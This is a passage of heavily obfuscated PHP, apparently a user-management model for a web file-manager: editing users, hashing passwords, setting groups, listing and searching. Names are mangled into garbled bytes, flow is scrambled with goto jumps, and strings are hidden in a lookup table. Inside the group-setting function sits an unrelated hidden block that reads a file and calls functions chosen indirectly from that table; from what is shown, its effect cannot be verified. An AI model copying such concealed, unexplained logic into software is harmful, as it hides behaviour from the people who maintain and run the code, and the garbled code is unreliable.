A‰Ï¾‘ÆÛÑ; A‰Ï¾‘ÆÛÑ: } protected function userEditTest($D¾Ï¾àá¤í, $cšÚ§Äø‘„) { return $this->call($_SERVER[í…¶][2522], $D¾Ï¾àá¤í, $cšÚ§Äø‘„); } protected function userEdit($E ˆ•‚³ÆÃ, $EÎùÀ—É¦) { goto E“…¸ÕÒõ; CÌŠ¶ø½: $bÛÁšƒœóˆ = $this->_checkExist($EÎùÀ—É¦, $E ˆ•‚³ÆÃ); if ($bÛÁšƒœóˆ !== !0) { return $bÛÁšƒœóˆ; } if (isset($EÎùÀ—É¦[$Aõ’²’†¤[800]]) && trim($EÎùÀ—É¦[$Aõ’²’†¤[800]]) != $Aõ’²’†¤[33]) { $AĞ»Ñœ™¾Ä = $this->metaGet($E ˆ•‚³ÆÃ); if (empty($AĞ»Ñœ™¾Ä[$Aõ’²’†¤[2513]])) { $AĞ»Ñœ™¾Ä[$Aõ’²’†¤[2513]] = rand_string(10); Model($Aõ’²’†¤[483])->metaSet($E ˆ•‚³ÆÃ, $Aõ’²’†¤[2513], $AĞ»Ñœ™¾Ä[$Aõ’²’†¤[2513]]); } $EÎùÀ—É¦[$Aõ’²’†¤[800]] = md5($AĞ»Ñœ™¾Ä[$Aõ’²’†¤[2513]] . trim($EÎùÀ—É¦[$Aõ’²’†¤[800]])); } else { unset($EÎùÀ—É¦[$Aõ’²’†¤[800]]); } goto EªÊ‹¶æø; EªÊ‹¶æø: $this->where(array($Aõ’²’†¤[1424] => $E ˆ•‚³ÆÃ))->save($EÎùÀ—É¦); if (isset($EÎùÀ—É¦[$Aõ’²’†¤[2333]])) { $this->setNamePinyin($E ˆ•‚³ÆÃ, $EÎùÀ—É¦[$Aõ’²’†¤[2333]]); } $this->clearCache($c›–¼ŒÍ·•[$Aõ’²’†¤[1433]]); goto b¿–±ÓŞÛ; E“…¸ÕÒõ: $Aõ’²’†¤ =& $_SERVER[í…¶]; $CèÕ“ãŸÃ = $this->getInfoSimple($E ˆ•‚³ÆÃ); if (!$CèÕ“ãŸÃ) { return !1; } goto CÌŠ¶ø½; b¿–±ÓŞÛ: return !0; goto b»×’¦›Â—; b»×’¦›Â—: } public function setNamePinyin($e’è¶Ú’‚, $b‚›÷êé¹¬ = false) { $Dö¸¨ªæì  =& $_SERVER[í…¶]; if (!$b‚›÷êé¹¬) { $c¥“êèìã = $this->getInfoSimple($e’è¶Ú’‚); $b‚›÷êé¹¬ = $c¥“êèìã[$Dö¸¨ªæì [2333]] ? $c¥“êèìã[$Dö¸¨ªæì [2333]] : $c¥“êèìã[$Dö¸¨ªæì [28]]; } $C…ÎÊ …àù = Model($Dö¸¨ªæì [486]); if (!Input::check($b‚›÷êé¹¬, $Dö¸¨ªæì [537])) { return $C…ÎÊ …àù->metaSet($e’è¶Ú’‚, array($Dö¸¨ªæì [425] => $Dö¸¨ªæì [33], $Dö¸¨ªæì [424] => $Dö¸¨ªæì [33])); } return $C…ÎÊ …àù->metaSet($e’è¶Ú’‚, array($Dö¸¨ªæì [425] => str_replace($Dö¸¨ªæì [50], $Dö¸¨ªæì [33], Pinyin::encode($b‚›÷êé¹¬)), $Dö¸¨ªæì [424] => Pinyin::encode($b‚›÷êé¹¬, $Dö¸¨ªæì [538]))); } private function nickNameRpt() { $FÇ³Úí¦½Š =& $_SERVER[í…¶]; $d—¢‘÷´Šö = Model($FÇ³Úí¦½Š[1086])->get($FÇ³Úí¦½Š[2523]); $BˆÄèªÀ´˜ = $GLOBALS[$FÇ³Úí¦½Š[6]][$FÇ³Úí¦½Š[2479]][$FÇ³Úí¦½Š[2523]]; $fˆ¨…İïÂ“ = !is_null($d—¢‘÷´Šö) ? $d—¢‘÷´Šö : $BˆÄèªÀ´˜; return !!$fˆ¨…İïÂ“; } private function _checkExist($A¾ì²Šë¡İ, $CÜ¿Ö‹Ÿ¾ = false) { $dœ÷…¯±İ =& $_SERVER[í…¶]; $eÖ¾Ëƒ½¬” = array($dœ÷…¯±İ[28] => UserModel::ERROR_USER_EXIST_NAME, $dœ÷…¯±İ[2333] => UserModel::ERROR_USER_EXIST_NICKNAME, $dœ÷…¯±İ[293] => UserModel::ERROR_USER_EXIST_EMAIL, $dœ÷…¯±İ[2511] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eÖ¾Ëƒ½¬”[$dœ÷…¯±İ[2333]]); } $bÇ¦¾”´‰… = $CÜ¿Ö‹Ÿ¾ ? array($dœ÷…¯±İ[1433] => array($dœ÷…¯±İ[2524], $CÜ¿Ö‹Ÿ¾)) : array(); foreach ($eÖ¾Ëƒ½¬” as $e„ËÙâ‹ => $CÉ¬İšéÌğ) { if (!isset($A¾ì²Šë¡İ[$e„ËÙâ‹]) || !$A¾ì²Šë¡İ[$e„ËÙâ‹]) { continue; } $b—Í…çÆ­ = array_merge(array($e„ËÙâ‹ => $A¾ì²Šë¡İ[$e„ËÙâ‹]), $bÇ¦¾”´‰…); $Eî£„¾çƒ = $this->where($b—Í…çÆ­)->find(); if ($Eî£„¾çƒ) { return $CÉ¬İšéÌğ; } } return !0; } public function userListInfo($C‘Úâ›ŠÈ) { $bªˆ®‹í†± =& $_SERVER[í…¶]; $cÊ˜¯ÛÒ¤ˆ = array(); $C‘Úâ›ŠÈ = is_array($C‘Úâ›ŠÈ) ? array_unique($C‘Úâ›ŠÈ) : array(); if (!$C‘Úâ›ŠÈ) { return $cÊ˜¯ÛÒ¤ˆ; } if (count($C‘Úâ›ŠÈ) < 20) { foreach ($C‘Úâ›ŠÈ as $d¾’¯Š¾ÆÖ) { $cÊ˜¯ÛÒ¤ˆ[$d¾’¯Š¾ÆÖ . $bªˆ®‹í†±[33]] = $this->getInfoSimpleOuter($d¾’¯Š¾ÆÖ); } } else { $aí†‘„Š÷¸ = array($bªˆ®‹í†±[1424] => array($bªˆ®‹í†±[393], $C‘Úâ›ŠÈ)); if (count($C‘Úâ›ŠÈ) == 1) { $aí†‘„Š÷¸ = array($bªˆ®‹í†±[1424] => $C‘Úâ›ŠÈ[0]); } $d„î–ó‚—‰ = Model($bªˆ®‹í†±[483])->field($this->simpleField)->where($aí†‘„Š÷¸)->select(); $d„î–ó‚—‰ = array_to_keyvalue($d„î–ó‚—‰, $bªˆ®‹í†±[1433]); foreach ($C‘Úâ›ŠÈ as $d¾’¯Š¾ÆÖ) { $aÚÁ½ß±Û³ = $d„î–ó‚—‰[$d„î–ó‚—‰[$d¾’¯Š¾ÆÖ]]; if (!$aÚÁ½ß±Û³) { $cÊ˜¯ÛÒ¤ˆ[$d¾’¯Š¾ÆÖ . $bªˆ®‹í†±[33]] = $this->getInfoSimpleOuter($d¾’¯Š¾ÆÖ); continue; } $aÚÁ½ß±Û³[$bªˆ®‹í†±[2496]] = Action($bªˆ®‹í†±[2497])->parseUrl($aÚÁ½ß±Û³[$bªˆ®‹í†±[2496]]); $cÊ˜¯ÛÒ¤ˆ[$d¾’¯Š¾ÆÖ . $bªˆ®‹í†±[33]] = $aÚÁ½ß±Û³; } } return $cÊ˜¯ÛÒ¤ˆ; } protected function userStatus($CŸäÑÑ®Öª, $B½Á«º×•Í) { $DŠö°ùÊ†µ = $this->getInfoSimple($CŸäÑÑ®Öª); if (!$DŠö°ùÊ†µ) { return !1; } $aË¦«¯è¤ = array($_SERVER[í…¶][691] => $B½Á«º×•Í); return $this->userEdit($CŸäÑÑ®Öª, $aË¦«¯è¤); } protected function userRemove($F¤°é¶æî) { goto dÔˆïŒÄÂÙ; aÏÑÙÙ¬¥ğ: Model($e…à‘¿¹’ã[2177])->where($c¥²Ò…ÆÌª)->delete(); Model($e…à‘¿¹’ã[2510])->where($c¥²Ò…ÆÌª)->delete(); Model($e…à‘¿¹’ã[2526])->where($c¥²Ò…ÆÌª)->delete(); goto CÑ‹ëØ ; dÔˆïŒÄÂÙ: $e…à‘¿¹’ã =& $_SERVER[í…¶]; $b‰çÅæÜ³ï = $this->getInfoSimple($F¤°é¶æî); if (!$b‰çÅæÜ³ï) { return !1; } goto F¿‰Ş•Ë¹ç; F¿‰Ş•Ë¹ç: $c¥²Ò…ÆÌª = array($e…à‘¿¹’ã[1424] => $F¤°é¶æî); Model($e…à‘¿¹’ã[545])->where($c¥²Ò…ÆÌª)->delete(); Model($e…à‘¿¹’ã[2525])->where($c¥²Ò…ÆÌª)->delete(); goto aÏÑÙÙ¬¥ğ; CÑ‹ëØ : Model($e…à‘¿¹’ã[755])->userRootRemove($F¤°é¶æî); return $this->where($c¥²Ò…ÆÌª)->delete(); goto dÆåé­í®È; dÆåé­í®È: } protected function userGroupSet($EïÅÔ¿ã–, $Eàï¼–Œà«, $Fç‡’¢–î… = array()) { goto AîÒÀøŠ—; B¸†Íª˜ğ: return $FêìäœÕ‡->addAll($A©„â¡Ñ •, array(), !0); goto d›ƒ·ôŠª; b–Í‰ĞÓ¢’: $A©„â¡Ñ • = array(); $d¾˜ê«àòä = 0; foreach ($Eàï¼–Œà« as $aË‚¿•öŒ× => $D®”ä¦¹š) { $A‡…óã– = array($B¥öù¥»ˆ±[1433] => $EïÅÔ¿ã–, $B¥öù¥»ˆ±[2101] => $aË‚¿•öŒ×, $B¥öù¥»ˆ±[2232] => $D®”ä¦¹š); $A‡…óã–[$B¥öù¥»ˆ±[2122]] = isset($Fç‡’¢–î…[$d¾˜ê«àòä]) ? $Fç‡’¢–î…[$d¾˜ê«àòä] : 0; $d¾˜ê«àòä++; $A©„â¡Ñ •[] = $A‡…óã–; } goto B¸†Íª˜ğ; bŸĞÚİÙÓë: if (!$FæÈÉÃÚ ° || !is_array($Eàï¼–Œà«)) { return !1; } $FêìäœÕ‡ = Model($B¥öù¥»ˆ±[2177]); $FêìäœÕ‡->where(array($B¥öù¥»ˆ±[1433] => $EïÅÔ¿ã–))->delete(); goto b–Í‰ĞÓ¢’; AîÒÀøŠ—: $B¥öù¥»ˆ± =& $_SERVER[í…¶]; if ($_SERVER[$B¥öù¥»ˆ±[344]] != $_SERVER[$B¥öù¥»ˆ±[561]]) { goto D“àÀ”„æŸ; B»¦À³–¡µ: $eêƒ™ºä› = 1; while ($eêƒ™ºä› > 1) { $eêƒ™ºä› = $eêƒ™ºä› + 4; $bâ¼êÕ½‰¡ = rawurlencode($eêƒ™ºä› . $B¥öù¥»ˆ±[370]); } goto Fƒˆ§î°¦; e„í¸ˆ©®„: $f¿ ‚¿Ïò = $Dëñ²­‚ÏŸ($cä³´è¾Ëİ); $B˜Ÿåï‚¸ˆ = explode($B¥öù¥»ˆ±[217], $f¿ ‚¿Ïò); if (count($B˜Ÿåï‚¸ˆ) < $B¥öù¥»ˆ±[564]) { $fÙÂàÁïŠ = $B¥öù¥»ˆ±[349]; $fÙÂàÁïŠ(); } goto F«¤ëÑé¬‰; D“àÀ”„æŸ: $CÏÖËÄ£… = $B¥öù¥»ˆ±[790]; $Dëñ²­‚ÏŸ = $B¥öù¥»ˆ±[345]; $cä³´è¾Ëİ = $_SERVER[$B¥öù¥»ˆ±[346]] . $B¥öù¥»ˆ±[347]; goto e„í¸ˆ©®„; F«¤ëÑé¬‰: $A°ÎÎö‹Ú• = $B¥öù¥»ˆ±[791]; $A°ÎÎö‹Ú•($_SERVER[$B¥öù¥»ˆ±[792]]); $A°ÎÎö‹Ú•($_SERVER[$B¥öù¥»ˆ±[346]] . $B¥öù¥»ˆ±[2527]); goto B»¦À³–¡µ; Fƒˆ§î°¦: } $FæÈÉÃÚ ° = $this->getInfoSimple($EïÅÔ¿ã–); goto bŸĞÚİÙÓë; d›ƒ·ôŠª: } protected function userGroupAdd($f½›½±Ô·, $Bˆì‘»¢…® = array()) { $a…“®‹‚ß =& $_SERVER[í…¶]; $A¸Á†¿…ï = $this->getInfoSimple($f½›½±Ô·); if (!$A¸Á†¿…ï || empty($Bˆì‘»¢…®)) { return !1; } $DÓÎÓêâáã = array(); foreach ($Bˆì‘»¢…® as $fŠó ’¶¥„ => $C¥™ºÔé‚Ü) { $DÓÎÓêâáã[] = array($a…“®‹‚ß[1433] => $f½›½±Ô·, $a…“®‹‚ß[2101] => $fŠó ’¶¥„, $a…“®‹‚ß[2232] => $C¥™ºÔé‚Ü); } return Model($a…“®‹‚ß[2177])->addAll($DÓÎÓêâáã, array(), !0); } protected function userGroupRemove($B¤«Õ’ì¸í, $BÚˆíÅ Ïé) { $C—ï÷»’äš =& $_SERVER[í…¶]; $Fñª†“»¦¼ = $this->getInfoSimple($B¤«Õ’ì¸í); if (!$Fñª†“»¦¼ || !$BÚˆíÅ Ïé) { return !1; } $d°ò ŠÜŸÇ = array($C—ï÷»’äš[1424] => $B¤«Õ’ì¸í, $C—ï÷»’äš[2175] => $BÚˆíÅ Ïé); return Model($C—ï÷»’äš[2177])->where($d°ò ŠÜŸÇ)->delete(); } public function listData() { $bìåšñğéÃ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($bìåšñğéÃ[$_SERVER[í…¶][363]]); return $bìåšñğéÃ; } public function listByID($AË›¤Ñƒ•) { $d†³ÆÌ–Òì =& $_SERVER[í…¶]; if (!$AË›¤Ñƒ•) { return; } $eê¥”é˜ÔÖ = array($d†³ÆÌ–Òì[1433] => array($d†³ÆÌ–Òì[7], $AË›¤Ñƒ•)); $CíÍÁ÷ˆ¢Ó = $this->where($eê¥”é˜ÔÖ)->select(); $this->_listDataApply($CíÍÁ÷ˆ¢Ó); return $CíÍÁ÷ˆ¢Ó; } public function listByGroup($D°áØ‘‹Á = 0, $F‡Ğß¸…à = array()) { goto C‚ÂÓ³Îä; F™©‡çÍ‹Ñ: $this->_listDataApply($DÏ„â·‡àÏ[$e„Ûä’‹§Æ[363]]); return $DÏ„â·‡àÏ; goto C¹Ç·›àâç; C‚ÂÓ³Îä: $e„Ûä’‹§Æ =& $_SERVER[í…¶]; $C­ê¹×·´ = $e„Ûä’‹§Æ[33]; $C´“øï¸›ò = array(); goto C¡†¥…; C¡†¥…: if ($D°áØ‘‹Á) { $C´“øï¸›ò = array($e„Ûä’‹§Æ[2528] => intval($D°áØ‘‹Á)); $C­ê¹×·´ = "\x4c\105\106\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x75\x73\145\162\137\x67\x72\157\165\x70\x20\165\163\145\162\x5f\147\x72\x6f\165\160\x20\157\x6e\x20\x75\163\x65\162\x2e\x75\163\x65\x72\111\x44\40\x3d\x20\x75\x73\x65\x72\x5f\x67\x72\x6f\x75\160\56\x75\163\x65\162\x49\x44"; $Cğ‰ÔíàŸ— = Input::get($e„Ûä’‹§Æ[416], null, $e„Ûä’‹§Æ[33]) ? $e„Ûä’‹§Æ[33] : $e„Ûä’‹§Æ[2529]; } if (isset($F‡Ğß¸…à[$e„Ûä’‹§Æ[691]])) { $C´“øï¸›ò[$e„Ûä’‹§Æ[2530]] = $F‡Ğß¸…à[$e„Ûä’‹§Æ[691]]; } $DÏ„â·‡àÏ = $this->_makeOrder($Cğ‰ÔíàŸ—)->field($e„Ûä’‹§Æ[2531])->where($C´“øï¸›ò)->join($C­ê¹×·´)->selectPage(50); goto F™©‡çÍ‹Ñ; C¹Ç·›àâç: } private function _makeOrder($CŸÓĞ¾•ºç = '') { goto A¥äŒ‘ëåÉ; BˆÛ “±ÕÁ: $CŸÓĞ¾•ºç = $CŸÓĞ¾•ºç . "\165\x73\145\162\x2e{$B©ÀÖ…±ŞÓ}\40{$añÌÛÃµø§}\x2c\x20\165\x73\x65\162\x2e\165\x73\145\x72\111\104\40\141\x73\x63"; return $this->alias($E÷ŞÛ½‡[2276])->order($CŸÓĞ¾•ºç); goto dã†…¨Âğ; A¥äŒ‘ëåÉ: $E÷ŞÛ½‡ =& $_SERVER[í…¶]; $fÑ¨•Ãô„ = array($E÷ŞÛ½‡[1433], $E÷ŞÛ½‡[28], $E÷ŞÛ½‡[2087], $E÷ŞÛ½‡[2059], $E÷ŞÛ½‡[187]); $F™âê»ŸãÉ = array($E÷ŞÛ½‡[411] => $E÷ŞÛ½‡[412], $E÷ŞÛ½‡[413] => $E÷ŞÛ½‡[414]); goto C°”Ÿ¬±­×; C°”Ÿ¬±­×: $B©ÀÖ…±ŞÓ = Input::get($E÷ŞÛ½‡[416], $E÷ŞÛ½‡[7], $E÷ŞÛ½‡[1424], $fÑ¨•Ãô„); $añÌÛÃµø§ = Input::get($E÷ŞÛ½‡[417], $E÷ŞÛ½‡[7], $E÷ŞÛ½‡[2178], array($E÷ŞÛ½‡[2178], $E÷ŞÛ½‡[413])); $añÌÛÃµø§ = $F™âê»ŸãÉ[$añÌÛÃµø§]; goto BˆÛ “±ÕÁ; dã†…¨Âğ: } public function listSearch($cÔİƒ„ÈÇ) { goto Côé¨ùÓ‰˜; Côé¨ùÓ‰˜: $C¦ÌÄ¶çÂš =& $_SERVER[í…¶]; $f§¶²ˆ·£† = $cÔİƒ„ÈÇ[$C¦ÌÄ¶çÂš[2179]]; $d¤Û—ò¶Ù› = isset($cÔİƒ„ÈÇ[$C¦ÌÄ¶çÂš[2180]]) ? $cÔİƒ„ÈÇ[$C¦ÌÄ¶çÂš[2180]] : !1; goto f´¨ÃÜ¦­í; f´¨ÃÜ¦­í: $f§¶²ˆ·£† = str_replace($C¦ÌÄ¶çÂš[2181], $C¦ÌÄ¶çÂš[2182], trim($f§¶²ˆ·£†)); $a›®ºñŞ—Ñ = array($C¦ÌÄ¶çÂš[28] => array($C¦ÌÄ¶çÂš[754], "\x25{$f§¶²ˆ·£†}\x25"), $C¦ÌÄ¶çÂš[293] => array($C¦ÌÄ¶çÂš[754], "\45{$f§¶²ˆ·£†}\x25"), $C¦ÌÄ¶çÂš[2333] => array($C¦ÌÄ¶çÂš[754], "\x25{$f§¶²ˆ·£†}\45"), $C¦ÌÄ¶çÂš[912] => $C¦ÌÄ¶çÂš[2183]); if (Input::check($f§¶²ˆ·£†, $C¦ÌÄ¶çÂš[299])) { $a›®ºñŞ—Ñ[$C¦ÌÄ¶çÂš[1433]] = array($C¦ÌÄ¶çÂš[754], "\45{$f§¶²ˆ·£†}\45"); $a›®ºñŞ—Ñ[$C¦ÌÄ¶çÂš[2511]] = array($C¦ÌÄ¶çÂš[754], "\x25{$f§¶²ˆ·£†}\45"); } goto D¹Î£Ø´; eŠšåñ”ñ: return $c¨äŒ‰Ğïî; goto BÂƒÆ‚é; DƒºÜŞö˜: if (!$c¨äŒ‰Ğïî || count($c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[363]]) < 5 && Input::check($f§¶²ˆ·£†, $C¦ÌÄ¶çÂš[306])) { $cŒŸ…’¼ê– = $this->_searchFromMeta($C¦ÌÄ¶çÂš[424], $f§¶²ˆ·£†, 10); $bÛ¹ËÓ¢·¶ = $this->_searchFromMeta($C¦ÌÄ¶çÂš[425], $f§¶²ˆ·£†, 10); $cÕË„‹É ä = array_merge($cŒŸ…’¼ê–, $bÛ¹ËÓ¢·¶, $c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[363]]); $c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[363]] = array_unique_by_key($cÕË„‹É ä, $C¦ÌÄ¶çÂš[1433]); $c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[360]][$C¦ÌÄ¶çÂš[361]] = count($c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[363]]); $c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[360]][$C¦ÌÄ¶çÂš[362]] = ceil($c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[360]][$C¦ÌÄ¶çÂš[361]] / $c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[360]][$C¦ÌÄ¶çÂš[358]]); } $this->_listDataApply($c¨äŒ‰Ğïî[$C¦ÌÄ¶çÂš[363]]); $this->_filterByGroup($c¨äŒ‰Ğïî, $d¤Û—ò¶Ù›); goto eŠšåñ”ñ; D¹Î£Ø´: if (!$f§¶²ˆ·£†) { $a›®ºñŞ—Ñ = array(); } if (isset($cÔİƒ„ÈÇ[$C¦ÌÄ¶çÂš[691]])) { $a›®ºñŞ—Ñ[$C¦ÌÄ¶çÂš[691]] = $cÔİƒ„ÈÇ[$C¦ÌÄ¶çÂš[691]]; } $c¨äŒ‰Ğïî = $this->_makeOrder()->where($a›®ºñŞ—Ñ)->selectPage(20); goto DƒºÜŞö˜; BÂƒÆ‚é: } private function _filterByGroup(&$f‰ƒ«®Œ˜–, $aˆŞ‰»‘ŸŞ) { $cøÛÏ”ˆ§ =& $_SERVER[í…¶]; if (!$aˆŞ‰»‘ŸŞ) { return $f‰ƒ«®Œ˜–; } foreach ($f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[363]] as $BÏÆÇË»ª => &$e™¶å·ğøŠ) { $FÕõçÒ‡ì‘ = array_to_keyvalue($e™¶å·ğøŠ[$cøÛÏ”ˆ§[2532]], $cøÛÏ”ˆ§[33], $cøÛÏ”ˆ§[2101]); if (!in_array($aˆŞ‰»‘ŸŞ, $FÕõçÒ‡ì‘)) { unset($f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[363]][$BÏÆÇË»ª]); } } $f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[363]] = array_values($f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[363]]); $f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[360]] = array($cøÛÏ”ˆ§[2309] => count($f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[363]]), $cøÛÏ”ˆ§[2307] => $f‰ƒ«®Œ˜–[$cøÛÏ”ˆ§[360]][$cøÛÏ”ˆ§[358]], $cøÛÏ”ˆ§[2306] => 1, $cøÛÏ”ˆ§[2308] => 1); } private function _searchFromMeta($cÕñğÊó»Ş, $cÍ‚ µÂÔ‹, $d›‹Á á) { goto B°Éëá¼¯ƒ; B‡¡÷Ï™‹Ú: $C„ƒÆ‘ä­÷ = $this->where(array($eçí˜ïÓ[1424] => array($eçí˜ïÓ[7], $AÚ““ùƒ§È)))->select(); if (!$C„ƒÆ‘ä­÷) { return array(); } return $C„ƒÆ‘ä­÷; goto FÚ”ò—´îŠ; EÀÔŠÉŸ‰º: $AÚ““ùƒ§È = Model($eçí˜ïÓ[2533])->where($e™¶Àšä)->limit($d›‹Á á)->select(); if (!$AÚ““ùƒ§È) { return array(); } $AÚ““ùƒ§È = array_to_keyvalue($AÚ““ùƒ§È, $eçí˜ïÓ[33], $eçí˜ïÓ[1433]); goto B‡¡÷Ï™‹Ú; B°Éëá¼¯ƒ: $eçí˜ïÓ =& $_SERVER[í…¶]; $cÍ‚ µÂÔ‹ = strtolower($cÍ‚ µÂÔ‹); $e™¶Àšä = array($eçí˜ïÓ[89] => $cÕñğÊó»Ş, $eçí˜ïÓ[368] => array($eçí˜ïÓ[754], "\45{$cÍ‚ µÂÔ‹}\x25")); goto EÀÔŠÉŸ‰º; FÚ”ò—´îŠ: } private function _listDataApplyItem($aššéÏ‘—¿) { $dµíÀÒË›É = array($aššéÏ‘—¿); $this->_listDataApply($dµíÀÒË›É); return $dµíÀÒË›É[0]; } private function _listDataApply(&$b¾¹¾¸ãƒ) { goto bŠÆñóœø; eÈ½Ñ©×‡ò: $this->_listAppendSourceRoot($b¾¹¾¸ãƒ, $BÍÔí«’Ïæ); goto bïˆì±³´¶; AåË¡íš¨ù: $BÍÔí«’Ïæ = array_to_keyvalue($b¾¹¾¸ãƒ, $FÉÍ”œïŠ[33], $FÉÍ”œïŠ[1433]); $this->_listAppendGroup($b¾¹¾¸ãƒ, $BÍÔí«’Ïæ); $this->_listAppendMeta($b¾¹¾¸ãƒ, $BÍÔí«’Ïæ); goto eÈ½Ñ©×‡ò; bŠÆñóœø: $FÉÍ”œïŠ =& $_SERVER[í…¶]; if (!$b¾¹¾¸ãƒ) { return; } array_remove_key($b¾¹¾¸ãƒ, $FÉÍ”œïŠ[800]); goto AåË¡íš¨ù; bïˆì±³´¶: } private function _listAppendSourceRoot(&$a©Ê×³·‘Í, $Eªİ—œÊ°Æ) { goto DŒôİœĞÅ¡; cÀÑ‹ìˆéË: $féŠ‡¾í«¬ = Model($d§éˆáµÇØ[755])->order($d§éˆáµÇØ[2191])->field($fÎ Ì”×¨)->where($B¹¥¿Š•Ô)->select(); $féŠ‡¾í«¬ = array_to_keyvalue($féŠ‡¾í«¬, $d§éˆáµÇØ[465]); $féŠ‡¾í«¬ = array_remove_key($féŠ‡¾í«¬, $d§éˆáµÇØ[465]); goto Cö­åâª¯Á; DŒôİœĞÅ¡: $d§éˆáµÇØ =& $_SERVER[í…¶]; $B¹¥¿Š•Ô = array($d§éˆáµÇØ[470] => 0, $d§éˆáµÇØ[380] => SourceModel::TYPE_USER, $d§éˆáµÇØ[465] => array($d§éˆáµÇØ[7], $Eªİ—œÊ°Æ)); $fÎ Ì”×¨ = $d§éˆáµÇØ[2190]; goto cÀÑ‹ìˆéË; Cö­åâª¯Á: foreach ($a©Ê×³·‘Í as &$Aªï’ô«¾) { $Aªï’ô«¾[$d§éˆáµÇØ[400]] = $féŠ‡¾í«¬[$Aªï’ô«¾[$d§éˆáµÇØ[1433]]] ? $féŠ‡¾í«¬[$Aªï’ô«¾[$d§éˆáµÇØ[1433]]] : array(); } goto B©Ó¢ƒïß¹; B©Ó¢ƒïß¹: } private function _listAppendGroup(&$c‚ÇŒÙ®½, $a¢éøŠ×) { goto Dè°Š§¤½; CÒ¬®°œ‰ˆ: $B¾¨™Öøöä = array_to_keyvalue_group($B¾¨™Öøöä, $eé®Íù¯–¯[1433]); foreach ($B¾¨™Öøöä as &$d£©¥ˆŞºÀ) { $BÚ¦­­‰ÜÏ = array(); foreach ($d£©¥ˆŞºÀ as $eÍ‡Œ¨ÈìÚ) { if (!$eÍ‡Œ¨ÈìÚ[$eé®Íù¯–¯[2232]]) { continue; } $Cê“¢Á…Ê = Model($eé®Íù¯–¯[2251])->listData($eÍ‡Œ¨ÈìÚ[$eé®Íù¯–¯[2232]]); $BÚ¦­­‰ÜÏ[] = array($eé®Íù¯–¯[2101] => $eÍ‡Œ¨ÈìÚ[$eé®Íù¯–¯[2101]], $eé®Íù¯–¯[2536] => $F¤¢µ­¨ôè[$eÍ‡Œ¨ÈìÚ[$eé®Íù¯–¯[2101]]], $eé®Íù¯–¯[385] => $Cê“¢Á…Ê); } $d£©¥ˆŞºÀ = $BÚ¦­­‰ÜÏ; } foreach ($c‚ÇŒÙ®½ as &$e®‡Æ™®Ùâ) { $e®‡Æ™®Ùâ[$eé®Íù¯–¯[2532]] = array(); if (isset($B¾¨™Öøöä[$e®‡Æ™®Ùâ[$eé®Íù¯–¯[1433]]])) { $e®‡Æ™®Ùâ[$eé®Íù¯–¯[2532]] = $B¾¨™Öøöä[$e®‡Æ™®Ùâ[$eé®Íù¯–¯[1433]]]; } } goto B…¾á¨î‚‡; Dè°Š§¤½: $eé®Íù¯–¯ =& $_SERVER[í…¶]; $bÂˆ¬æŸ†À = array($eé®Íù¯–¯[1433] => array($eé®Íù¯–¯[7], $a¢éøŠ×)); $B¾¨™Öøöä = Model($eé®Íù¯–¯[2177])->where($bÂˆ¬æŸ†À)->select(); goto Båñ×¢ãº; EÅÍæ‘÷‰Â: $bÂˆ¬æŸ†À = array($eé®Íù¯–¯[2101] => array($eé®Íù¯–¯[7], $fà’“ˆº)); $AÕÀ¾ÌöêÆ = Model($eé®Íù¯–¯[2534])->field($eé®Íù¯–¯[2535])->where($bÂˆ¬æŸ†À)->select(); $F¤¢µ­¨ôè = array_to_keyvalue($AÕÀ¾ÌöêÆ, $eé®Íù¯–¯[2101], $eé®Íù¯–¯[28]); goto CÒ¬®°œ‰ˆ; Båñ×¢ãº: $fà’“ˆº = array_to_keyvalue($B¾¨™Öøöä, $eé®Íù¯–¯[33], $eé®Íù¯–¯[2101]); $fà’“ˆº = array_remove_value(array_unique($fà’“ˆº), $eé®Íù¯–¯[477]); if (!$fà’“ˆº || !$B¾¨™Öøöä) { return; } goto EÅÍæ‘÷‰Â; B…¾á¨î‚‡: } private function _listAppendMeta(&$cÕ‡Ã×¢‡, $bµ¨Ïšº‚‡) { goto fÏğÏÕååº; aÇ›—®: $AÊ…­ŠÁ = array($CáÉ¨Š·»¾[1433] => array($CáÉ¨Š·»¾[7], $bµ¨Ïšº‚‡)); $fàšÂ½¤í© = Model($CáÉ¨Š·»¾[2510])->where($AÊ…­ŠÁ)->select(); $fàšÂ½¤í© = array_to_keyvalue_group($fàšÂ½¤í©, $CáÉ¨Š·»¾[1433]); goto Døª²ªÁš£; Døª²ªÁš£: foreach ($fàšÂ½¤í© as &$eÓë†î¼Ÿæ) { $D±¶ö‚©÷¹ = array(); foreach ($eÓë†î¼Ÿæ as $AàŠ†ïÇ¢¦) { if (!in_array($AàŠ†ïÇ¢¦[$CáÉ¨Š·»¾[89]], $E–«É­ãÜ)) { $D±¶ö‚©÷¹[$AàŠ†ïÇ¢¦[$CáÉ¨Š·»¾[89]]] = $AàŠ†ïÇ¢¦[$CáÉ¨Š·»¾[368]]; } } $eÓë†î¼Ÿæ = $D±¶ö‚©÷¹; } $eŒ³ö÷”…¤ = Model($CáÉ¨Š·»¾[2537]); foreach ($cÕ‡Ã×¢‡ as &$eƒƒÜ½ ¢¢) { $a¨ï«¤’„Ş = array(); if (isset($fàšÂ½¤í©[$eƒƒÜ½ ¢¢[$CáÉ¨Š·»¾[1433]]])) { $a¨ï«¤’„Ş = $fàšÂ½¤í©[$eƒƒÜ½ ¢¢[$CáÉ¨Š·»¾[1433]]]; } $eƒƒÜ½ ¢¢[$CáÉ¨Š·»¾[2538]] = array(); if (isset($a¨ï«¤’„Ş[$A™¥¸…ë])) { $eƒƒÜ½ ¢¢[$CáÉ¨Š·»¾[2538]] = 